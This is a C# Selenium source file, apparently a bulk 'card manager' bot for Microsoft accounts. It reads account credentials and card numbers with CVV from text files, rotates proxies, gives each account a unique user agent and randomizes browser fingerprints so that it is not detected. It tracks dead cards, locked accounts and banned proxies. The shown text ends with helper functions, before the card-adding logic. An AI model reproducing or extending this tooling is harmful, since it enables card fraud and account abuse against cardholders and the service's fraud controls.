// NOTE: This C# code now includes a complete and strict conversion of the original Python script
// including address handling, fallback logic, check_login recursion, thai/sing region handling,
// card switching, logging, threading, and all control flow exactly as written in Python.

using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using SeleniumExtras.WaitHelpers;
using OpenQA.Selenium.Remote;
using System.Text.RegularExpressions;
using OpenQA.Selenium.Interactions;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;
using System.Net;
using System.Threading.Tasks;
using System.Text;
using System.Runtime.InteropServices;


// NOTE: This C# code now includes a complete and strict conversion of the original Python script
// including address handling, fallback logic, check_login recursion, thai/sing region handling,
namespace SeleniumConversion
{
    // Simple Console configuration utility
    public static class ConsoleConfig
    {
        private static bool configurationAttempted = false;

        public static void ConfigureConsole()
        {
            if (configurationAttempted) return;
            configurationAttempted = true;

            try
            {
                Console.InputEncoding = System.Text.Encoding.UTF8;
                Console.OutputEncoding = System.Text.Encoding.UTF8;
                
                // Set reasonable console size
                try
                {
                    if (Console.WindowWidth < 80) Console.WindowWidth = 80;
                    if (Console.WindowHeight < 30) Console.WindowHeight = 30;
                }
                catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Console configuration failed: {ex.Message}");
            }
        }
    }

    class Program
    {
        static bool is_exit = false;
        static bool is_use_proxy = false;
        static object fileLock = new object();
        static object printLock = new object();
        static bool show_browser = false;
        static int totalAccounts = 0;
        static int successfulCards = 0;
        static int failedCards = 0;
        static int lockedAccounts = 0;
        static int originalCardCount = 0; // Track original number of cards for progress calculation
        static DateTime startTime = DateTime.Now;
        
        // Thread-safe proxy management
        private static readonly object proxyLock = new object();
        private static int currentProxyIndex = 0;
        private static List<string> proxyList = new List<string>();
        private static HashSet<string> bannedProxies = new HashSet<string>();
        
        // Thread-safe address management
        private static readonly object addressLock = new object();
        
        // Thread-safe card management - Global tracking
        private static readonly object cardLock = new object();
        private static HashSet<string> globalUsedCards = new HashSet<string>();
        private static HashSet<string> globalDeadCards = new HashSet<string>();
        
        // Thread-safe user agent management
        private static readonly object userAgentLock = new object();
        private static List<string> userAgentList = new List<string>();
        private static HashSet<string> usedUserAgents = new HashSet<string>();
        private static Dictionary<string, string> accountUserAgents = new Dictionary<string, string>(); // Track which user agent is used for each account
        
        // Thread-specific action tracking
        private static readonly Dictionary<int, List<string>> threadActions = new Dictionary<int, List<string>>();
        private static readonly object threadActionsLock = new object();

        // Thread colors for better visual separation - more vibrant colors
        private static readonly ConsoleColor[] ThreadColors = {
            ConsoleColor.Cyan, ConsoleColor.Green, ConsoleColor.Yellow, ConsoleColor.Magenta,
            ConsoleColor.Blue, ConsoleColor.Red, ConsoleColor.White, ConsoleColor.DarkCyan,
            ConsoleColor.DarkGreen, ConsoleColor.DarkYellow, ConsoleColor.DarkMagenta,
            ConsoleColor.DarkBlue, ConsoleColor.DarkRed, ConsoleColor.Gray,
            ConsoleColor.DarkGray, ConsoleColor.Black
        };

        // Method to get thread color
        private static ConsoleColor GetThreadColor(int threadId)
        {
            return ThreadColors[threadId % ThreadColors.Length];
        }

        // Method to load used user agents from file on startup
        private static void LoadUsedUserAgents()
        {
            lock (userAgentLock)
            {
                try
                {
                    string usedUserAgentsPath = Path.Combine(GetBaseDir(), "sor/used_useragents.txt");
                    if (File.Exists(usedUserAgentsPath))
                    {
                        var lines = File.ReadAllLines(usedUserAgentsPath);
                        foreach (var line in lines)
                        {
                            if (!string.IsNullOrWhiteSpace(line) && line.Contains('|'))
                            {
                                var parts = line.Split('|');
                                if (parts.Length >= 2)
                                {
                                    string email = parts[0].Trim();
                                    string userAgent = parts[1].Trim();
                                    
                                    // Add to used user agents
                                    usedUserAgents.Add(userAgent);
                                    
                                    // Don't restore account mappings since accounts might be different on restart
                                    // but keep the user agents marked as used
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Warning: Could not load used user agents: {ex.Message}");
                }
            }
        }

        // Method to get unique user agent for account
        private static string GetUniqueUserAgent(string accountEmail)
        {
            lock (userAgentLock)
            {
                // Check if this account already has a user agent assigned
                if (accountUserAgents.ContainsKey(accountEmail))
                {
                    return accountUserAgents[accountEmail];
                }
                
                // Load user agents from file if not loaded
                if (userAgentList.Count == 0)
                {
                    string userAgentPath = Path.Combine(GetBaseDir(), "sor/useragents.txt");
                    if (File.Exists(userAgentPath))
                    {
                        var allUserAgents = File.ReadAllLines(userAgentPath)
                            .Where(l => !string.IsNullOrWhiteSpace(l))
                            .Select(l => l.Trim())
                            .ToList();
                        userAgentList = allUserAgents.Where(ua => !usedUserAgents.Contains(ua)).ToList();
                    }
                }
                
                if (userAgentList.Count == 0)
                {
                    throw new Exception("No user agents available (all may be used or file is empty)");
                }
                
                // Get the first available user agent
                string userAgent = userAgentList[0];
                
                // Mark as used and remove from available list
                usedUserAgents.Add(userAgent);
                userAgentList.Remove(userAgent);
                accountUserAgents[accountEmail] = userAgent;
                
                // Save used user agent to file for persistence
                AppendToFile("sor/used_useragents.txt", $"{accountEmail}|{userAgent}");
                
                return userAgent;
            }
        }

        // Method to release user agent when account processing is complete
        private static void ReleaseUserAgent(string accountEmail)
        {
            lock (userAgentLock)
            {
                if (accountUserAgents.ContainsKey(accountEmail))
                {
                    string userAgent = accountUserAgents[accountEmail];
                    accountUserAgents.Remove(accountEmail);
                    // Note: We don't add it back to available list to ensure no reuse
                }
            }
        }

        // Method to get fingerprint randomization options with enhanced randomization
        private static Dictionary<string, object> GetRandomFingerprint()
        {
            Random random = new Random();
            
            var resolutions = new[] {
                new { width = 1920, height = 1080 },
                new { width = 1366, height = 768 },
                new { width = 1536, height = 864 },
                new { width = 1440, height = 900 },
                new { width = 1600, height = 900 },
                new { width = 1280, height = 720 },
                new { width = 1680, height = 1050 },
                new { width = 1360, height = 768 },
                new { width = 1024, height = 768 }
            };
            
            var languages = new[] { 
                "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8", 
                "en-CA,en;q=0.9", "en-AU,en;q=0.9", "de-DE,de;q=0.9",
                "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "it-IT,it;q=0.9"
            };
            
            var timezones = new[] { 
                "America/New_York", "Europe/London", "Asia/Singapore", 
                "America/Los_Angeles", "Europe/Berlin", "America/Chicago",
                "Europe/Paris", "Asia/Tokyo", "Australia/Sydney",
                "America/Toronto", "Europe/Madrid", "Asia/Hong_Kong"
            };
            
            var webglVendors = new[] {
                "Google Inc.", "Google Inc. (Intel)", "Google Inc. (NVIDIA)",
                "Google Inc. (AMD)", "Google Inc. (Microsoft)", "Mozilla"
            };
            
            var webglRenderers = new[] {
                "ANGLE (Intel, Intel(R) HD Graphics)",
                "ANGLE (Intel, Intel(R) UHD Graphics)",
                "ANGLE (NVIDIA, NVIDIA GeForce GTX)",
                "ANGLE (AMD, AMD Radeon)",
                "WebKit WebGL", "Mozilla WebGL"
            };
            
            var platforms = new[] {
                "Win32", "MacIntel", "Linux x86_64", "Win64"
            };
            
            var hardwareConcurrency = new[] { 2, 4, 6, 8, 12, 16 };
            var deviceMemory = new[] { 2, 4, 8, 16 };
            
            var resolution = resolutions[random.Next(resolutions.Length)];
            
            return new Dictionary<string, object>
            {
                { "width", resolution.width },
                { "height", resolution.height },
                { "language", languages[random.Next(languages.Length)] },
                { "timezone", timezones[random.Next(timezones.Length)] },
                { "webgl_vendor", webglVendors[random.Next(webglVendors.Length)] },
                { "webgl_renderer", webglRenderers[random.Next(webglRenderers.Length)] },
                { "platform", platforms[random.Next(platforms.Length)] },
                { "hardware_concurrency", hardwareConcurrency[random.Next(hardwareConcurrency.Length)] },
                { "device_memory", deviceMemory[random.Next(deviceMemory.Length)] },
                { "color_depth", random.Next(2) == 0 ? 24 : 32 },
                { "pixel_depth", random.Next(2) == 0 ? 24 : 32 },
                { "screen_orientation", random.Next(2) == 0 ? "landscape-primary" : "portrait-primary" },
                { "max_touch_points", random.Next(11) }, // 0-10 touch points
                { "connection_type", new[] { "4g", "3g", "wifi", "ethernet", "bluetooth" }[random.Next(5)] }
            };
        }

        // Method to add action to thread history (keep last 8 for better visibility)
        private static void AddThreadAction(int threadId, string action)
        {
            lock (threadActionsLock)
            {
                if (!threadActions.ContainsKey(threadId))
                {
                    threadActions[threadId] = new List<string>();
                }
                
                threadActions[threadId].Add($"{DateTime.Now:HH:mm:ss} - {action}");
                
                // Keep only last 8 actions for better thread visibility
                if (threadActions[threadId].Count > 8)
                {
                    threadActions[threadId].RemoveAt(0);
                }
            }
        }

        // Method to initialize thread tracking
        private static void InitializeThreadTracking(int threadId)
        {
            lock (threadActionsLock)
            {
                if (!threadActions.ContainsKey(threadId))
                {
                    threadActions[threadId] = new List<string>();
                    threadActions[threadId].Add($"{DateTime.Now:HH:mm:ss} - Thread initialized");
                }
            }
        }

        // Method to get thread actions
        private static string GetThreadActions(int threadId)
        {
            lock (threadActionsLock)
            {
                if (threadActions.ContainsKey(threadId))
                {
                    return string.Join("\n", threadActions[threadId]);
                }
                return "No actions recorded";
            }
        }

        // Method to get next proxy in round-robin fashion
        private static string GetNextProxy()
        {
            lock (proxyLock)
            {
                if (proxyList.Count == 0)
                {
                    string proxyPath = Path.Combine(GetBaseDir(), "sor/proxy.txt");
                    if (File.Exists(proxyPath))
                    {
                        var allProxies = File.ReadAllLines(proxyPath).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
                        // Filter out banned proxies
                        proxyList = allProxies.Where(p => !bannedProxies.Contains(p)).ToList();
                    }
                }
                
                if (proxyList.Count == 0)
                {
                    throw new Exception("No proxies available (all may be banned)");
                }
                
                string proxy = proxyList[currentProxyIndex % proxyList.Count];
                currentProxyIndex++;
                return proxy;
            }
        }

        // Method to ban a proxy from rotation
        private static void BanCurrentProxy(string proxy)
        {
            if (!is_use_proxy || string.IsNullOrWhiteSpace(proxy))
            {
                return;
            }
            lock (proxyLock)
            {
                try
                {
                    if (!bannedProxies.Contains(proxy))
                    {
                        bannedProxies.Add(proxy);
                        
                        // Remove from active proxy list
                        proxyList.Remove(proxy);
                        
                        // Update proxy file to remove banned proxy
                        string proxyPath = Path.Combine(GetBaseDir(), "sor/proxy.txt");
                        if (File.Exists(proxyPath))
                        {
                            var lines = File.ReadAllLines(proxyPath).Where(l => l.Trim() != proxy.Trim()).ToArray();
                            File.WriteAllLines(proxyPath, lines);
                        }
                        
                        // Save banned proxy to banned list file
                        AppendToFile("sor/banned_proxies.txt", proxy);
                    }
                }
                catch
                {
                }
            }
        }

        // Method to get and remove address from address.txt file (thread-safe)
        private static (string street, string city, string postal)? GetAndRemoveAddress(int threadId)
        {
            lock (addressLock)
            {
                try
                {
                    string addressPath = Path.Combine(GetBaseDir(), "sor/address.txt");
                    
                    if (!File.Exists(addressPath) || !File.ReadLines(addressPath).Any())
                    {
                        return null; // No addresses available
                    }
                    
                    // Read all lines and get the first non-empty one
                    var allLines = File.ReadAllLines(addressPath).Where(l => !string.IsNullOrWhiteSpace(l)).ToArray();
                    
                    if (allLines.Length == 0)
                    {
                        return null; // No addresses available
                    }
                    
                    // Take the first address
                    string addressLine = allLines[0].Trim();
                    
                    // Remove the used address from the file
                    var remainingLines = allLines.Skip(1).ToArray();
                    File.WriteAllLines(addressPath, remainingLines);
                    
                    // Parse the address line (expecting format: street|city|postal)
                    var parts = addressLine.Split('|');
                    if (parts.Length >= 3)
                    {
                        return (parts[0].Trim(), parts[1].Trim(), parts[2].Trim());
                    }
                    else if (parts.Length >= 1)
                    {
                        // If not properly formatted, return null to fail the account
                        return null;
                    }
                    else
                    {
                        // Invalid address format
                        return null;
                    }
                }
                catch (Exception)
                {
                    // If error occurs, return null to fail the account
                    return null;
                }
            }
        }

        static void DisplayWelcomeMessage()
        {
            Console.Clear();
            
            // Set console title
            try
            {
                Console.Title = "Microsoft Card Manager - Professional Edition";
            }
            catch { }
            
            // Modern minimalist header
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("┌─────────────────────────────────────────────────────────────────┐");
            Console.WriteLine("│                                                                 │");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("│                   MICROSOFT CARD MANAGER                        │");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("│                     Professional Edition                        │");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("│                                                                 │");
            Console.WriteLine("└─────────────────────────────────────────────────────────────────┘");
            Console.ResetColor();
            
            Console.WriteLine();
            
            // Clean features list
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("  ✓ Multi-threaded Processing");
            Console.WriteLine(is_use_proxy ? "  ✓ Global Proxy Network" : "  ✓ Proxyless Mode");
            Console.WriteLine("  ✓ Real-time Analytics");
            Console.WriteLine("  ✓ Enhanced Security");
            Console.ResetColor();
            
            Console.WriteLine();
            
            // Simple credits
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("            Crafted by Bashdar & Raad");
            Console.ResetColor();
            
            Console.WriteLine();
            Console.WriteLine("Press any key to start...");
        }

        // Console optimization flags
        private static bool consoleUpdateInProgress = false;
        private static DateTime lastConsoleUpdate = DateTime.MinValue;
        private static readonly TimeSpan MinUpdateInterval = TimeSpan.FromMilliseconds(500);

        static void UpdateProgress()
        {
            lock (printLock)
            {
                try
                {
                    // Prevent rapid successive updates to reduce flickering
                    if (consoleUpdateInProgress || (DateTime.Now - lastConsoleUpdate) < MinUpdateInterval)
                    {
                        return;
                    }
                    
                    consoleUpdateInProgress = true;
                    lastConsoleUpdate = DateTime.Now;
                    
                    Console.Clear();
                    
                    // Modern header
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine("┌─────────────────────────────────────────────────────────────────┐");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("│                   MICROSOFT CARD MANAGER                        │");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine($"│                   Live Dashboard - {DateTime.Now:HH:mm:ss}     │");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine("└─────────────────────────────────────────────────────────────────┘");
                    Console.ResetColor();
                    
                    Console.WriteLine();
                    
                    // Statistics section with clean design
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("📊 PERFORMANCE METRICS");
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("─────────────────────────────────────────────────────────────────");
                    Console.ResetColor();
                    
                    // Clean statistics display
                    Console.Write("Total: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write($"{totalAccounts,4}");
                    Console.ResetColor();
                    
                    Console.Write("    Success: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write($"{successfulCards,4}");
                    Console.ResetColor();
                    
                    Console.Write("    Failed: ");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"{failedCards,4}");
                    Console.ResetColor();
                    
                    Console.Write("    Locked: ");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write($"{lockedAccounts,4}");
                    Console.ResetColor();
                    
                    // Success rate
                    double successRate = totalAccounts > 0 ? (double)successfulCards / totalAccounts * 100 : 0;
                    Console.Write("    Rate: ");
                    Console.ForegroundColor = successRate > 75 ? ConsoleColor.Green : 
                                            (successRate > 50 ? ConsoleColor.Yellow : ConsoleColor.Red);
                    Console.WriteLine($"{successRate:F1}%");
                    Console.ResetColor();
                    
                    // Progress bar showing total accounts finished vs original card count
                    Console.Write($"Progress ({totalAccounts}/{originalCardCount}): ");
                    double progressPercentage = originalCardCount > 0 ? (double)totalAccounts / originalCardCount * 100 : 0;
                    string progressBar = CreateSimpleProgressBar(progressPercentage, 50);
                    Console.ForegroundColor = progressPercentage > 75 ? ConsoleColor.Green : 
                                            (progressPercentage > 50 ? ConsoleColor.Yellow : ConsoleColor.Red);
                    Console.WriteLine($"{progressBar} {progressPercentage:F1}%");
                    Console.ResetColor();
                    
                    Console.WriteLine();
                    
                    // Network status with clean design
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("🌐 NETWORK STATUS");
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("─────────────────────────────────────────────────────────────────");
                    Console.ResetColor();
                    
                    if (is_use_proxy)
                    {
                        lock (proxyLock)
                        {
                            Console.Write("Active: ");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.Write($"{proxyList.Count,3}");
                            Console.ResetColor();
                            
                            Console.Write("    Banned: ");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write($"{bannedProxies.Count,3}");
                            Console.ResetColor();
                            
                            Console.Write("    Total: ");
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.Write($"{(proxyList.Count + bannedProxies.Count),3}");
                            Console.ResetColor();
                            
                            // Network health
                            double proxyHealth = (proxyList.Count + bannedProxies.Count) > 0 ? 
                                (double)proxyList.Count / (proxyList.Count + bannedProxies.Count) * 100 : 0;
                            Console.Write("    Health: ");
                            Console.ForegroundColor = proxyHealth > 70 ? ConsoleColor.Green : 
                                                    (proxyHealth > 30 ? ConsoleColor.Yellow : ConsoleColor.Red);
                            Console.WriteLine($"{proxyHealth:F1}%");
                            Console.ResetColor();
                        }
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Proxyless mode enabled");
                        Console.ResetColor();
                    }
                    
                    Console.WriteLine();
                    
                    // Thread monitor with improved grid layout to prevent overlapping
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("🔧 THREAD MONITOR");
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("─────────────────────────────────────────────────────────────────");
                    Console.ResetColor();
                    
                    lock (threadActionsLock)
                    {
                        int maxThreads = threadActions.Keys.Count > 0 ? threadActions.Keys.Max() + 1 : 0;
                        
                        if (maxThreads == 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Gray;
                            Console.WriteLine("System initializing - preparing threads...");
                            Console.ResetColor();
                        }
                        else
                        {
                            // Display threads in a 2-column grid format to prevent overlapping
                            int threadsPerRow = 2;
                            int maxDisplayThreads = Math.Min(maxThreads, 8); // Show max 8 threads (4 rows x 2 columns)
                            
                            for (int row = 0; row < (maxDisplayThreads + threadsPerRow - 1) / threadsPerRow; row++)
                            {
                                for (int col = 0; col < threadsPerRow; col++)
                                {
                                    int threadId = row * threadsPerRow + col;
                                    if (threadId >= maxDisplayThreads) break;
                                    
                                    // Left column or right column formatting
                                    if (col == 0)
                                    {
                                        // Left column - full width if only one thread in row
                                        DisplayThreadInfo(threadId, threadId + 1 >= maxDisplayThreads || (threadId + 1) % threadsPerRow == 0);
                                    }
                                    else
                                    {
                                        // Right column - add padding and display
                                        Console.Write("  │  ");
                                        DisplayThreadInfo(threadId, true);
                                    }
                                }
                                if (row < (maxDisplayThreads + threadsPerRow - 1) / threadsPerRow - 1)
                                {
                                    Console.WriteLine(); // Add line break between rows
                                }
                            }
                            
                            Console.WriteLine(); // Final line break
                            
                            if (maxThreads > 8)
                            {
                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.WriteLine($"+ {maxThreads - 8} more threads running...");
                                Console.ResetColor();
                            }
                        }
                    }
                    
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"Runtime: {DateTime.Now.Subtract(startTime):hh\\:mm\\:ss} | Press Ctrl+C to stop");
                    Console.ResetColor();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Display error: {ex.Message}");
                }
                finally
                {
                    consoleUpdateInProgress = false;
                }
            }
        }

        // Helper method to display thread information in a compact format
        private static void DisplayThreadInfo(int threadId, bool isFullWidth)
        {
            ConsoleColor threadColor = GetThreadColor(threadId);
            
            Console.Write($"T{threadId + 1:00}: ");
            Console.ForegroundColor = threadColor;
            
            string status = threadActions.ContainsKey(threadId) ? "ACT" : "IDL";
            Console.Write($"[{status}]");
            Console.ResetColor();
            
            // Show latest action with appropriate width
            string latestAction = "Waiting...";
            if (threadActions.ContainsKey(threadId) && threadActions[threadId].Count > 0)
            {
                var lastAction = threadActions[threadId].Last();
                var actionParts = lastAction.Split(new string[] { " - " }, 2, StringSplitOptions.None);
                if (actionParts.Length > 1)
                {
                    latestAction = actionParts[1];
                    // Adjust length based on column width
                    int maxLength = isFullWidth ? 50 : 25;
                    if (latestAction.Length > maxLength)
                    {
                        latestAction = latestAction.Substring(0, maxLength - 3) + "...";
                    }
                }
            }
            
            Console.Write(" ");
            
            // Simple color coding
            if (latestAction.Contains("SUCCESS"))
                Console.ForegroundColor = ConsoleColor.Green;
            else if (latestAction.Contains("ERROR"))
                Console.ForegroundColor = ConsoleColor.Red;
            else if (latestAction.Contains("LOCKED"))
                Console.ForegroundColor = ConsoleColor.Yellow;
            else
                Console.ForegroundColor = ConsoleColor.White;
            
            if (isFullWidth)
            {
                Console.WriteLine(latestAction);
            }
            else
            {
                Console.Write(latestAction.PadRight(28)); // Fixed width for column alignment
            }
            Console.ResetColor();
        }

        // Simple progress bar helper
        static string CreateSimpleProgressBar(double percentage, int width)
        {
            int filled = (int)(percentage * width / 100);
            string bar = new string('█', filled) + new string('░', width - filled);
            return $"[{bar}] {percentage:F1}%";
        }

        static void PrintSuccess(int threadNumber, string message)
        {
            lock (printLock)
            {
                AddThreadAction(threadNumber, $"SUCCESS: {message}");
                
                try
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write($"[T{threadNumber + 1:00}] ✓ ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(message);
                    Console.ResetColor();
                }
                catch
                {
                    Console.WriteLine($"[T{threadNumber + 1:00}] ✓ SUCCESS: {message}");
                }
            }
        }

        static void PrintError(int threadNumber, string message)
        {
            lock (printLock)
            {
                AddThreadAction(threadNumber, $"ERROR: {message}");
                
                try
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"[T{threadNumber + 1:00}] ✗ ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(message);
                    Console.ResetColor();
                }
                catch
                {
                    Console.WriteLine($"[T{threadNumber + 1:00}] ✗ ERROR: {message}");
                }
            }
        }

        static void PrintInfo(int threadNumber, string message)
        {
            lock (printLock)
            {
                AddThreadAction(threadNumber, $"INFO: {message}");
                
                try
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write($"[T{threadNumber + 1:00}] ℹ ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(message);
                    Console.ResetColor();
                }
                catch
                {
                    Console.WriteLine($"[T{threadNumber + 1:00}] ℹ INFO: {message}");
                }
            }
        }

        static void PrintWarning(int threadNumber, string message)
        {
            lock (printLock)
            {
                AddThreadAction(threadNumber, $"WARNING: {message}");
                
                try
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write($"[T{threadNumber + 1:00}] ⚠ ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(message);
                    Console.ResetColor();
                }
                catch
                {
                    Console.WriteLine($"[T{threadNumber + 1:00}] ⚠ WARNING: {message}");
                }
            }
        }

        static string GetBaseDir()
        {
            return AppDomain.CurrentDomain.BaseDirectory;
        }

        static void EnsureRequiredFilesExist()
        {
            string baseDir = GetBaseDir();
            string sorDir = Path.Combine(baseDir, "sor");
            
            // Create sor directory if it doesn't exist
            if (!Directory.Exists(sorDir))
            {
                Directory.CreateDirectory(sorDir);
            }
            
            // Define required files with default content
            var requiredFiles = new Dictionary<string, string[]>
            {
                { "acc.txt", new string[] { "example@outlook.com:password123" } },
                { "cc.txt", new string[] { "4111111111111111|12|2025|123" } },
                { "address.txt", new string[] { 
                    "123 Sample Street|Singapore|238889", 
                    "456 Example Road|Singapore|678901",
                    "789 Test Avenue|Singapore|567890",
                    "321 Demo Lane|Singapore|345678",
                    "654 Trial Street|Singapore|876543"
                } },
                { "listofnames.txt", new string[] { "John Doe", "Jane Smith", "Alex Johnson" } },
                { "useragents.txt", new string[] { 
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
                } },
                { "fail_acc.txt", new string[0] },
                { "fail_cc.txt", new string[0] },
                { "sec_acc.txt", new string[0] },
                { "sec_cc.txt", new string[0] },
                { "loc_acc.txt", new string[0] },
                { "loc_cc.txt", new string[0] },
                { "not_added_cc.txt", new string[0] },
                { "dead_cards.txt", new string[0] },
                { "banned_proxies.txt", new string[0] },
                { "failed_acc_sys.txt", new string[0] },
                { "failed_cc_sys.txt", new string[0] },
                { "used_useragents.txt", new string[0] }
            };

            if (is_use_proxy)
            {
                requiredFiles.Add("proxy.txt", new string[] { "127.0.0.1:8080:username:password" });
            }
            
            foreach (var file in requiredFiles)
            {
                string filePath = Path.Combine(sorDir, file.Key);
                if (!File.Exists(filePath))
                {
                    try
                    {
                        if (file.Value.Length > 0)
                        {
                            File.WriteAllLines(filePath, file.Value);
                            Console.WriteLine($"Created default {file.Key} with sample data");
                        }
                        else
                        {
                            File.WriteAllText(filePath, "");
                            Console.WriteLine($"Created empty {file.Key}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Warning: Could not create {file.Key}: {ex.Message}");
                    }
                }
            }
        }

        static void AppendToFile(string relativePath, string content)
        {
            string path = Path.Combine(GetBaseDir(), relativePath);
            lock (fileLock)
            {
                try
                {
                    // Ensure directory exists
                    string? directory = Path.GetDirectoryName(path);
                    if (directory != null && !Directory.Exists(directory))
                    {
                        Directory.CreateDirectory(directory);
                    }
                    
                    File.AppendAllText(path, content + "\n");
                }
                catch
                {
                    // Removed direct console output to prevent "out of place" messages
                }
            }
        }

        static void DeleteLineFromFile(string path, string lineToRemove)
        {
            var lines = File.ReadAllLines(path).Where(l => l.Trim() != lineToRemove.Trim());
            File.WriteAllLines(path, lines);
        }

        static void RequeueAccount(string acc, string card)
        {
            // Add account and card back to the beginning of their respective files
            // This ensures they will be processed again with a new proxy
            lock (fileLock)
            {
                try
                {
                    string accPath = Path.Combine(GetBaseDir(), "sor/acc.txt");
                    string ccPath = Path.Combine(GetBaseDir(), "sor/cc.txt");
                    
                    // Read existing content
                    string[] existingAccounts = File.Exists(accPath) ? File.ReadAllLines(accPath) : new string[0];
                    string[] existingCards = File.Exists(ccPath) ? File.ReadAllLines(ccPath) : new string[0];
                    
                    // Prepare new content with requeued items at the beginning
                    List<string> newAccounts = new List<string> { acc };
                    newAccounts.AddRange(existingAccounts);
                    
                    List<string> newCards = new List<string>();
                    if (!string.IsNullOrWhiteSpace(card))
                    {
                        newCards.Add(card);
                    }
                    newCards.AddRange(existingCards);
                    
                    // Write back to files
                    File.WriteAllLines(accPath, newAccounts);
                    File.WriteAllLines(ccPath, newCards);
                    
                    // Release user agent for this account since it will be reassigned when retried
                    string accountEmail = acc.Contains(':') ? acc.Split(':')[0] : acc;
                    ReleaseUserAgent(accountEmail);
                    
                    // Removed direct console output to prevent "out of place" messages
                }
                catch
                {
                }
            }

            // Release the card from global used cards so it can be retried
            if (!string.IsNullOrWhiteSpace(card))
            {
                lock (cardLock)
                {
                    if (!globalDeadCards.Contains(card))
                    {
                        globalUsedCards.Remove(card);
                    }
                }
            }
        }

        static string GetRandomLine(string path)
        {
            var lines = File.ReadAllLines(path);
            return lines[new Random().Next(lines.Length)].Trim();
        }

        static void RemoveEmptyLines(string path)
        {
            var lines = File.ReadAllLines(path).Where(l => !string.IsNullOrWhiteSpace(l));
            File.WriteAllLines(path, lines);
        }

        static IWebElement? FindElementWithWait(IWebDriver driver, By by, int timeoutSeconds = 300)
        {
            try
            {
                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(timeoutSeconds));
                return wait.Until(ExpectedConditions.ElementExists(by));
            }
            catch { return null; }
        }
        static IWebElement? FindElementWithWaitClickable(IWebDriver driver, By by, int timeoutSeconds = 300)
        {
            try
            {
                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(timeoutSeconds));
                return wait.Until(ExpectedConditions.ElementToBeClickable(by));
            }
            catch { return null; }
        }

        static string ReadFirstLine(string path) => File.Exists(path) ? File.ReadLines(path).FirstOrDefault() ?? "" : "";

